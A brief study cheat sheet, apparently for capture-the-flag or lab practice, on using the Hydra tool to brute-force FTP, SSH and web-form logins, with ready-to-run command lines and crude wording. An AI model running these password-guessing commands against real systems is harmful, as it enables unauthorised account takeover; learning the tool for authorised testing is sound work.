# Hydra

You use this bitch to brute force logins

Example:

To brute force an ftp server where you know the username, you would use 
`hydra -l user -P password.txt ftp://ipaddress`

You can also use it for an ssh server:
`hydra -l user -P password.txt ipaddress -t 4 ssh`

You can also use it for a web form. You must know what type of request it's making, which is usually GET or POST, use the developer tools to see what type of request the form is making. 
`sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

<login_credentials> - the username and password used to log in, for example, username=^USER^&password=^PASS^



